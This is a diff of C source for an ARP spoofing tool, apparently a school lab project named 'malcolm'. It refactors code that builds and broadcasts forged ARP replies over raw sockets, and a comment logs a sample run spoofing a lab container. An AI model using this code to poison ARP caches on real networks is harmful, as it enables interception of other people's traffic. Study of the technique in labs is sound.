@@ -14,53 +14,11 @@
 
 extern int g_sigint;
 
-void	forge_arp(struct ether_arp *original_arp, t_malcolm *m)
+void	set_replypacket(t_malcolm *m, unsigned char *packet, unsigned char *src, unsigned char *tgt)
 {
-	struct ether_arp forged_arp;
-
-	ft_memcpy(&forged_arp, original_arp, sizeof(struct ether_arp));
-	forged_arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
-
-	sscanf(m->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-		&forged_arp.arp_sha[0], &forged_arp.arp_sha[1], &forged_arp.arp_sha[2],
-		&forged_arp.arp_sha[3], &forged_arp.arp_sha[4], &forged_arp.arp_sha[5]);
-	inet_pton(AF_INET, m->source_ip, forged_arp.arp_spa);
-
-	sscanf(m->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-		&forged_arp.arp_tha[0], &forged_arp.arp_tha[1], &forged_arp.arp_tha[2],
-		&forged_arp.arp_tha[3], &forged_arp.arp_tha[4], &forged_arp.arp_tha[5]);
-	inet_pton(AF_INET, m->target_ip, forged_arp.arp_tpa);
-
-	printf("Forged ARP reply:\n");
-	printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-		forged_arp.arp_sha[0], forged_arp.arp_sha[1], forged_arp.arp_sha[2],
-		forged_arp.arp_sha[3], forged_arp.arp_sha[4], forged_arp.arp_sha[5]);
-	printf("  Sender IP: %s\n", m->source_ip);
-	printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-		forged_arp.arp_tha[0], forged_arp.arp_tha[1], forged_arp.arp_tha[2],
-		forged_arp.arp_tha[3], forged_arp.arp_tha[4], forged_arp.arp_tha[5]);
-	printf("  Target IP: %s\n", m->target_ip);
-	printf("  Operation: ARP Reply\n");
-
-}
-
-void	send_arp(t_malcolm *m)
-{
-	int ifindex = if_nametoindex("eth0");
-	if (ifindex == 0) {
-		fprintf(stderr, "if_nametoindex failed");
-		return;
-	}
-
-	unsigned char src_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-	set_sourcemac(m, src_mac);
-
-	// broadcast ARP to force a cache update on the target (unicast does not work well)
-	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-
 	struct ether_header eth;
-	ft_memcpy(eth.ether_shost, src_mac, 6);
-	ft_memcpy(eth.ether_dhost, broadcast_mac, 6);
+	ft_memcpy(eth.ether_shost, src, 6);
+	ft_memcpy(eth.ether_dhost, tgt, 6);
 	eth.ether_type = htons(ETH_P_ARP);
 
 	struct ether_arp arp;
@@ -69,14 +27,47 @@ void	send_arp(t_malcolm *m)
 	arp.ea_hdr.ar_hln = 6;
 	arp.ea_hdr.ar_pln = 4;
 	arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
-	ft_memcpy(arp.arp_sha, src_mac, 6);
+	ft_memcpy(arp.arp_sha, src, 6);
 	inet_pton(AF_INET, m->source_ip, arp.arp_spa);
-	ft_memcpy(arp.arp_tha, src_mac, 6);
+	ft_memcpy(arp.arp_tha, tgt, 6);
 	inet_pton(AF_INET, m->source_ip, arp.arp_tpa);
 
-	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
 	ft_memcpy(packet, &eth, sizeof(eth));
 	ft_memcpy(packet + sizeof(eth), &arp, sizeof(arp));
+}
+
+void	send_arp(t_malcolm *m)
+{
+	int ifindex = if_nametoindex("eth0");
+	if (ifindex == 0) {
+		fprintf(stderr, "Error: sendto failed\n");
+		return;
+	}
+
+	unsigned char src_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+	set_sourcemac(m, src_mac);
+	// broadcast ARP to force a cache update on the target (unicast does not work well)
+	unsigned char broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+
+/* This worked before but not anymore...
+Listening for packets between A and B...
+ARP request captured:
+  Sender MAC: 3a:a6:35:0a:21:06
+  Sender IP: 172.18.0.2
+  Target MAC: 00:00:00:00:00:00
+  Target IP: 172.18.0.3
+  Operation: ARP Request
+Fake ARP reply sent:
+  Sender MAC: 52:19:94:0c:52:c5
+  Sender IP: 172.18.0.3
+  Target MAC: ff:ff:ff:ff:ff:ff
+  Target IP: 172.18.0.2
+  Operation: ARP Reply
+Successfully spoofed the target, exiting.
+*/
+
+	unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+	set_replypacket(m, packet, src_mac, broadcast_mac);
 
 	struct sockaddr_ll sll = {0};
 	sll.sll_ifindex = ifindex;
@@ -87,7 +78,9 @@ void	send_arp(t_malcolm *m)
 	if (bytes_sent < 0) {
 		fprintf(stderr, "Error: sendto failed\n");
 	} else {
-		printf("Successfully sent fake ARP reply\n");
+		if (m->verbose)
+			print_arp(packet);
+		printf("Reply packet sent, exiting.\n");
 	}
 }
 
